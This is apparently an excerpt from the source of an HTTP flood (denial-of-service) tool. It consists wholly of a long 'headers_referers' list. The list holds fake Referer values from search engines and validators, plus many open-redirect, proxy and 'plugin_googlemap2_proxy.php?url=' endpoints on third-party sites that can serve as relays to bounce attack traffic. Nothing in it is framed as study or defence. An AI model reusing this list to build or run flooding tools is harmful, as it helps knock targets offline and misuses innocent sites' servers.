	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
	headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
	headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://regex.info/exif.cgi?url=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://regex.info/exif.cgi?url=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')
        headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.heatwalkingcycling.org/index.php?pg=')
	headers_referers.append('http://fresno.steinwaydealer.com/index.php?go=')
	headers_referers.append('http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=')
	headers_referers.append('http://www.karplaw.com/index.php?go=')
	headers_referers.append('http://www.veithsymposium.org/index.php?pg=')
	headers_referers.append('http://www.zikgu.info/search.php?go=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://abcnews.go.com/?page=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=')
	headers_referers.append('http://www.webmd.com/lung/tc/acute-bronchitis-topic-overview?page=')
	headers_referers.append('http://www.benefitmall.com/?TabID=36&emailurl=')
	headers_referers.append('http://www.tolerance.org/?source=redirect&url=teachingtolerance?url=')
	headers_referers.append('http://www.accuride.co.jp/cgi/check.cgi?url=')
	headers_referers.append('http://www.caafcgilsicilia.it/?id_pagina=')
	headers_referers.append('http://www.professioni24.ilsole24ore.com/?page=')
	headers_referers.append('http://italia.virgilio.it/?ckset=force&amp;cityRedirect=falseredirect=')
	headers_referers.append('http://oknabm.ru/index.php?pg=')
	headers_referers.append('http://www.thrombosis2016.org/index.php?go=')
	headers_referers.append('http://www.gotm.net/index.php?go=')
	headers_referers.append('http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=')
	headers_referers.append('http://david.bach.profesores.ie.edu/?profesor=david.bach&pagina=')
	headers_referers.append('http://javier.carrillo.profesores.ie.edu/?profesor=javier.carrillo&pagina=')
	headers_referers.append('http://www.fabrizio.salvador.profesores.ie.edu/?profesor=fabrizio.salvador&pagina=')
	headers_referers.append('http://manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://efernandez-cantelli.profesores.ie.edu/?profesor=efernandez-cantelli&pagina=')
	headers_referers.append('http://www.manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://www.marvin.com/?page=')
	headers_referers.append('http://www.ivrr.de/proxy.php?url=')
	headers_referers.append('http://validator.w3.org/checklink?uri=')
	headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
	headers_referers.append('http://evoec.com/review/redirect.php?url=')
	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
	headers_referers.append('http://apke.ru/redirect.php?url=')
	headers_referers.append('http://seodrum.com/redirect.php?url=')
	headers_referers.append('http://redrool.com/redirect.php?url=')
	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
	headers_referers.append('http://searchtoday.info/redirect.php?url=')
	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
	headers_referers.append('http://palinstravels.co.uk/redirect.php?url=')
	headers_referers.append('http://www.phuketbranches.com/admin/redirect.php?url=')
	headers_referers.append('http://tools.strugacreative.com/redirect.php?url=')
	headers_referers.append('http://www.elec-intro.com/redirect.php?url=')
	headers_referers.append('http://maybeit.net/redirect.php?url=')
	headers_referers.append('http://www.usgpru.net/redirect.php?url=')
	headers_referers.append('http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=')
	headers_referers.append('http://www.webaverage.com/redirect.php?url=')
	headers_referers.append('http://www.seorehash.com/redirect.php?url=')
	headers_referers.append('http://www.seo.khabarsaz.net/redirect.php?url=')
	headers_referers.append('http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=')
	headers_referers.append('http://www.informeseogratis.com/redirect.php?url=')
	headers_referers.append('http://www.websites-canada.com/redirect.php?url=')
	headers_referers.append('http://zakaztovarov.net/redirect.php?url=')
	headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
	headers_referers.append('http://www.marumura.com/redirect.php?url=')
	headers_referers.append('http://old.leginet.eu/redirect.php?url=')
	headers_referers.append('http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=')
	headers_referers.append('http://www.tuangou.do/proxy.php?url=')
	headers_referers.append('http://www.gvpl.ca/url/proxy.php?url=')
	headers_referers.append('http://weiter-lesen.net/web/proxy.php?url=')
	headers_referers.append('http://soroka-vorovka.com/proxy/proxy.php?url=')
	headers_referers.append('http://www.cogsci.ed.ac.uk/~richard/xml-check.cgi?url=')
	headers_referers.append('http://pro.athealth.co.jp/cgi-bin/pro/check.cgi?url=')
	headers_referers.append('http://ukrhome.net/go.php?url=')
	headers_referers.append('http://www.aliancaandroid.com/go.php?url=')
	headers_referers.append('http://www.hangglider.kiev.ua/go.php?url=')
	headers_referers.append('http://it4pal.com/ar/go.php?url=')
	headers_referers.append('http://paperplane.su/go.php?url=')
	headers_referers.append('http://www.education.net.au/go.php?url=')
	headers_referers.append('http://www.bloggerexp.com/go.php?url=')
	headers_referers.append('http://www.lifetype.ru/go.php?url=')
	headers_referers.append('http://blogerator.ru/go.php?url=')
	headers_referers.append('http://www.hella.ru/go.php?url=')
	headers_referers.append('http://fcmanutd.com/go.php?url=')
	headers_referers.append('http://www.sitysoft.com/go.php?url=')
	headers_referers.append('https://www.google.com/interstitial?url=')
	headers_referers.append('http://www.flashreport.org/blog/go.php?url=')
	headers_referers.append('http://www.otworld.de/go.php?url=')
	headers_referers.append('http://www.ennk.ru/go.php?url=')
	headers_referers.append('http://www.xoxohth.com/go.php?url=')
	headers_referers.append('http://dochtm.com/go.php?url=')
	headers_referers.append('http://www.autoadmit.com/go.php?url=')
	headers_referers.append('http://www.vttour.fr/actu/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://baanna.net/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://www.webchirkut.com/go.php?url=')
	headers_referers.append('http://www.parkcity.org/redirect.aspx?url=')
	headers_referers.append('http://hao.zw51.cn/go.php?url=')
	headers_referers.append('http://dmoz.by/go.php?url=')
	headers_referers.append('http://www.dandelionradio.com/go.php?url=')
	headers_referers.append('http://www.go.php-fusion-iran.com/go.php?url=')
	headers_referers.append('http://helpful-information.com/relationships/go.php?url=')
	headers_referers.append('http://www.health.omskinform.ru/go.php?url=')
	headers_referers.append('http://www.eitforum.com/go.php?url=')
	headers_referers.append('http://ipove.info/go.php?url=')
	headers_referers.append('http://www.treasure-vacations.com/go.php?url=')
	headers_referers.append('http://www.deutsche-krieger.de/go.php?url=')
	headers_referers.append('http://rusbody.com/go.php?url=')
	headers_referers.append('http://www.bonsai-for-beginners.com/go.php?url=')
	headers_referers.append('http://twitnow.ru/go.php?url=')
	headers_referers.append('http://www.1300dental.com.au/go.php?url=')
	headers_referers.append('http://engelcosmetology.kiev.ua/go.php?url=')
	headers_referers.append('http://vps.cohenrisk.com/~xoxohth/go.php?url=')
	headers_referers.append('http://valaholeuropaban.uw.hu/guestbook/go.php?url=')
	headers_referers.append('http://enrique-iglesias.net/guestbook/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.find-a-car.info/go.php?url=')
	headers_referers.append('http://snowcore.net/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://www.1300franchises.com/go.php?url=')
	headers_referers.append('http://www.information-guru.com/book-marketing/go.php?url=')
	headers_referers.append('http://www.boxingscene.com/weight-loss/go.php?url=')
	headers_referers.append('http://www.ninja-thailand.com/go.php?url=')
	headers_referers.append('http://shack.ir/go.php?url=')
	headers_referers.append('http://www.quelsoft.com/go.php?url=')
	headers_referers.append('http://www.jonko.eu/tools/hide_referrer/go.php?url=')
	headers_referers.append('http://lj.hangye5.com/go.php?url=')
	headers_referers.append('http://www.lightningring.com/guestbook/go.php?url=')
	headers_referers.append('http://www.1300directory.com.au/go.php?url=')
	headers_referers.append('http://www.litinvest.com/catalog/go.php?url=')
	headers_referers.append('http://www.1300clothing.com.au/go.php?url=')
	headers_referers.append('http://verkehrshaus.org/go.php?url=')
	headers_referers.append('http://www.xohth.com/beta/go.php?url=')
	headers_referers.append('http://auctionsinfo.net76.net/go.php?url=')
	headers_referers.append('http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=')
	headers_referers.append('http://www.1300dentist.com.au/go.php?url=')
	headers_referers.append('http://www.forodeprogramas.com/go.php?url=')
	headers_referers.append('http://thatware.org/go.php?url=')
	headers_referers.append('http://www.star.lu/go.php?url=')
	headers_referers.append('http://www.dailytechinfo.org/go.php?url=')
	headers_referers.append('http://m-bizportal.ru/go.php?url=')
	headers_referers.append('http://geostats2004.com/go.php?url=')
	headers_referers.append('http://shopdazzles.com/guestbook/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://www.1800dental.com.au/go.php?url=')
	headers_referers.append('http://www.flappen.nl/gb/go.php?url=')
	headers_referers.append('http://webmasterplus.us/go/go.php?url=')
	headers_referers.append('http://www.sportzone.ru/go.php?url=')
	headers_referers.append('http://kuzen.ru/go.php?url=')
	headers_referers.append('http://1300dating.com.au/go.php?url=')
	headers_referers.append('http://kinoamator.ru/go.php?url=')
	headers_referers.append('http://autoqa.org/go.php?url=')
	headers_referers.append('http://1300agents.com.au/go.php?url=')
	headers_referers.append('http://depressionclub.awardspace.com/go.php?url=')
	headers_referers.append('http://www.1300lifestyle.com.au/go.php?url=')
	headers_referers.append('http://www.onlinegratis.tv/go.php?url=')
	headers_referers.append('http://7days.kiev.ua/go.php?url=')
	headers_referers.append('http://www.jenteporten.no/go.php?url=')
	headers_referers.append('http://www.recipes.portalnews.de/go.php?url=')
	headers_referers.append('http://www.infogine.com/articles/aerobics-cardio/go.php?url=')
	headers_referers.append('http://13auto.com.au/go.php?url=')
	headers_referers.append('http://www.socialgrid.com/go.php?url=')
	headers_referers.append('http://www.spaleon.de/go.php?url=')
	headers_referers.append('http://waptrochoi.net/go.php?url=')
	headers_referers.append('http://www.ai.rug.nl/~doesburg/gbook/go.php?url=')
	headers_referers.append('http://www.keralaclick.com/photography/go.php?url=')
	headers_referers.append('http://kormoranfolk.hu/guestbook/go.php?url=')
	headers_referers.append('http://sidlogic.com/content/recipes/go.php?url=')
	headers_referers.append('http://www.languageisavirus.com/articles/writing/language/go.php?url=')
	headers_referers.append('http://2013toyotacorolla.com/go.php?url=')
	headers_referers.append('http://customerserviceauthority.com/go.php?url=')
	headers_referers.append('http://www.beautytipsadvice.infoslobber.com/go.php?url=')
	headers_referers.append('http://www.tripdirect.com/go.php?url=')
	headers_referers.append('http://spiritual-link.com/go.php?url=')
	headers_referers.append('http://learningresource.info/hair-loss-and-thinning/go.php?url=')
	headers_referers.append('http://www.backpacker.no/go.php?url=')
	headers_referers.append('http://aff.apk4fun.com/go.php?url=')
	headers_referers.append('http://www.totalwars.ru/go.php?url=')
	headers_referers.append('http://www.fediea.org/go.php?url=')
	headers_referers.append('http://articles.pointshop.com/college/go.php?url=')
	headers_referers.append('http://mcpe.tw/go.php?url=')
	headers_referers.append('http://www.qosmo.com/go.php?url=')
	headers_referers.append('http://www.alopa.com/go.php?url=')
	headers_referers.append('http://coreychang.net/gbook/go.php?url=')
	headers_referers.append('http://www.1001topwords.com/marketing1/marketing/go.php?url=')
	headers_referers.append('http://www.bait-tackle.com/go.php?url=')
	headers_referers.append('http://monkeezemarketing.com/go.php?url=')
	headers_referers.append('http://www.lincolnhsbrooklyn.com/go.php?url=')
	headers_referers.append('http://healthwebsitebusinesses.com/demo/diabetes/go.php?url=')
	headers_referers.append('http://ww3.myonlinestats.com/go/go.php?url=')
	headers_referers.append('http://www.wmhs.com/newmobile/redirect.php?page=')
	headers_referers.append('http://www.szene-drinks.com/redirect.php?page=')
	headers_referers.append('http://www.swzundert.nl/redirect.php?page=')
	headers_referers.append('http://www.denbreems.nl/redirect.php?page=')
	headers_referers.append('http://www.flohmarkt.ch/redirect.php?page=')
	headers_referers.append('http://www.erhvervscentrum.dk/redirect.php?page=')
	headers_referers.append('http://www.netintellgames.com/redirect.php?page=')
	headers_referers.append('http://www.pia.org/IRC/qs/redirect.php?page=')
	headers_referers.append('http://www.pcpros-tx.com/php/redirect.php?page=')
	headers_referers.append('http://www.allencapital.com/redirect.php?page=')
	headers_referers.append('http://www.taosadultbasketballleague.com/redirect.php?page=')
	headers_referers.append('http://taosadultbasketball.com/redirect.php?page=')
	headers_referers.append('http://www.graphisoftus.com/redirect.php?page=')
	headers_referers.append('http://purificato.org/rawlab/redirect.php?page=')
	headers_referers.append('http://www.anglobelge.com/EN/splash-page/redirect.php?page=')
	headers_referers.append('http://tzf.free.fr/redirect.php?page=')
	headers_referers.append('http://www.tandem-club.org.uk/files/public_html/redirect.php?page=')
	headers_referers.append('http://rawlab.mindcreations.com/redirect.php?page=')
	headers_referers.append('http://www.hxtrack.com/redirect.php?page=')
	headers_referers.append('http://signaturesx.com/redirect.php?page=')
	headers_referers.append('http://www.fsds.sanmarinoscacchi.sm/gotoURL.asp?url=')
	headers_referers.append('http://www.niemannpick.org/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.pillole.org/public/aspnuke/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.quiere-t.net/gotoURL.asp?url=')
	headers_referers.append('http://www.pocoserio.com/gotoURL.asp?url=')
	headers_referers.append('http://win.aiafa.it/gotoURL.asp?url=')
	headers_referers.append('http://www.centromorin.it/aspnuke207/gotoURL.asp?url=')
	headers_referers.append('http://www.asim.it/public/gotoURL.asp?url=')
	headers_referers.append('http://www.straz.bialapodlaska.pl/km/gotoURL.asp?url=')
	headers_referers.append('http://www.beatote.com/gotoURL.asp?url=')
	headers_referers.append('http://www.monteargentario.it/gotoURL.asp?url=')
	headers_referers.append('http://www.trasporti.marche.it/nuke/gotoURL.asp?url=')
	headers_referers.append('http://www.elparadise.com/gotoURL.asp?url=')
	headers_referers.append('http://www.chiauci-webforum.it/gotoURL.asp?url=')
	headers_referers.append('http://www.icfpet.it/gotoURL.asp?url=')
	headers_referers.append('http://www.dgtale.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aspnuke.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aicritalia.org/gotoURL.asp?url=')
	headers_referers.append('http://www.viggiu-in-rete.org/newsite/gotoURL.asp?url=')
	headers_referers.append('http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=')
	headers_referers.append('http://www.dffyw.com/dir/gotourl.asp?url=')
	headers_referers.append('http://www.mentalism.it/gotoURL.asp?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
	headers_referers.append('http://www.golfclubambrosiano.it/gotoURL.asp?url=')
	headers_referers.append('http://resuite.upg.it/gotoURL.asp?url=')
	headers_referers.append('http://www.cgqd.com/shop/it/gotourl.asp?url=')
	headers_referers.append('http://www.unicyclist.it/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.idealdieta.it/gotoURL.asp?url=')
	headers_referers.append('https://www.google.pl/interstitial?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://gmodules.com/ig/creator?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=')
        headers_referers.append('http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=')
        headers_referers.append('http://www.onlinewebcheck.com/check.php?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://about42.nl/www/showheaders.php;POST;about42.nl.txt')
        headers_referers.append('http://browsershots.org;POST;browsershots.org.txt')
        headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
        headers_referers.append('http://www.comicgeekspeak.com/proxy.php?url=')
        headers_referers.append('http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=')
